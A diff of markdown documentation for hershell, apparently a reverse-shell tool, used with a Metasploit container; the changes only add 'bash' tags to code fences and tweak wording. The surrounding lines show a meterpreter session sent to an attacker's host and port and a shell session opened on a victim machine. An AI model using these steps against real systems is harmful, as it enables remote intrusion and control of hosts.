@@ -164,7 +164,7 @@ ENTRYPOINT [ "serve", "-dir", "/go/bin/"]
 
 To launch our web page and fetch our files, we simply run:
 
-```
+```bash
 docker run -d hershell:latest
 ```
 
@@ -201,6 +201,7 @@ Contrary to the previous method, MSF will only need our `server.key` file.
 
 
 To launch our `metasploit` container, we simply do:
+
 ```bash
 $ docker run -it -p "8443:8443" -v ~/.msf4:/root/.msf4 -v /tmp/msf:/tmp/data remnux/metasploit
 ```
@@ -219,7 +220,7 @@ We'll launch the `msfconsole` and let it load. Once you're greeted with the prom
 
 We can use `wget` from inside the `msfconsole` and fetch them from our previously mentioned `serve` http page.
 
-```
+```bash
 msfconsole
 msf5 > wget http://DOCKER-IP:8000/server.key
 
@@ -237,7 +238,7 @@ msf5 > exploit -j
 
 ```
 
-In your hershell console, simply type:
+In your hershell console, type:
 
 ```bash
 [hershell]> meterpreter https YOUR-DOCKER-IP:8443
@@ -280,7 +281,7 @@ msf5 > sessions -l
 
 Launch hershell as you would and...
 
-```
+```bash
 [*] Command shell session 1 opened (DOCKER-IP:8088 -> VICTIM:39370) at 2018-10-04 02:26:32 +0000
 ```
 
